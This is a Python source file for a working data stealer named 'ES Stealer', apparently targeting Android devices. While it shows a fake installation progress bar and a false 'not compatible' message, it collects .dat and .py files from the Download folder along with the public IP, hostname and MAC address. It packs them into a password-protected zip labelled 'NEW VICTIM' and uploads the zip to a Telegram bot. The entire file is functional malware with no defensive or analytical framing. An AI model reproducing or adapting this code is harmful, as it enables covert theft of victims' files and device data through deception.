import os, platform, socket, sys, time, uuid, re, threading

try:
	from requests import get,post
except:
	os.system("pip install requests")

try:
	import pyzipper
except:
	os.system("pip install pyzipper")
	
class Stealer:
    def __init__(self):
        self.bot_token = 'TOKEN_BOT'
        self.chat_id = 'CHAT_ID'
        self.zip_filename = 'CollectedData.zip'
        self.download_dir = '/sdcard/Download/'
        self.file_extensions = ['.dat', '.py']
        self.zip_password = b'@MrEsfelurm'  

    def banner(self):
        art = r"""
╦┌┐┌┌─┐┌┬┐┌─┐┬  ┬  ┬┌┐┌┌─┐
║│││└─┐ │ ├─┤│  │  │││││ ┬
╩┘└┘└─┘ ┴ ┴ ┴┴─┘┴─┘┴┘└┘└─┘
        """
        print("\033[1;33m" + art + "\033[0m")

    def get_public_ip(self):
        try:
            response = get('https://api.ipify.org?format=json', timeout=10)
            return response.json().get('ip', 'Unknown')
        except:
            return "Unknown"

    def find_target_files(self):
        found_files = []
        for root, _, files in os.walk(self.download_dir):
            for file in files:
                if any(file.lower().endswith(ext) for ext in self.file_extensions):
                    found_files.append(os.path.join(root, file))
        return found_files

    def get_system_info(self):
        return {
            'Platform': platform.platform(),
            'Processor': platform.processor(),
            'System': platform.system(),
            'MAC Address': ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        }

    def create_zip(self, files, system_info):
        global info_text

        with pyzipper.AESZipFile(self.zip_filename, 'w', compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as zipf:
            zipf.setpassword(self.zip_password)

            for file in files:
                arcname = os.path.basename(file)
                if arcname in zipf.namelist():
                    base, ext = os.path.splitext(arcname)
                    count = 1
                    while f"{base}_{count}{ext}" in zipf.namelist():
                        count += 1
                    arcname = f"{base}_{count}{ext}"
                zipf.write(file, arcname)

            info_text = (
                f"NEW VICTIM\n"
                f"⚡ ES Stealer ⚡\n"
                f"Public IP: {self.get_public_ip()}\n"
                f"Device Name: {socket.gethostname()}\n"
                f"Platform: {system_info['Platform']}\n"
                f"System: {system_info['System']}\n"
                f"MAC Address: {system_info['MAC Address']}\n"
            )

            zipf.writestr('DeviceInfo.txt', info_text.encode())

    def send_to_telegram(self, system_info):
        try:
            with open(self.zip_filename, 'rb') as file:
                files = {'document': file}
                url = f"https://api.telegram.org/bot{self.bot_token}/sendDocument"
                response = post(url, files=files, data={
                    'chat_id': self.chat_id,
                    'caption': info_text
                })
                if response.status_code != 200:
                    print("\n[!] Failed to send file. Try using a VPN.")
        except Exception as e:
            print(f"\n[!] Error while sending file: {e}")
        finally:
            if os.path.exists(self.zip_filename):
                os.remove(self.zip_filename)

    def loading_animation(self):
        for i in range(101):
            sys.stdout.write(f"\rInstalling: [{i:3}%] {'=' * (i // 5)}{' ' * (20 - i // 5)}")
            sys.stdout.flush()
            time.sleep(0.10)
        print("\n[+] This tool is not compatible with your device!")

    def run(self):
        try:
            os.system('clear')
            self.banner()
            files = self.find_target_files()
            system_info = self.get_system_info()
            self.create_zip(files, system_info)

            t1 = threading.Thread(target=self.loading_animation)
            t2 = threading.Thread(target=self.send_to_telegram, args=(system_info,))

            t1.start()
            t2.start()
            t1.join()
            t2.join()

        except Exception as e:
            print(f"[!] Error occurred: {e}")


if __name__ == "__main__":
    stealer = Stealer()
    stealer.run()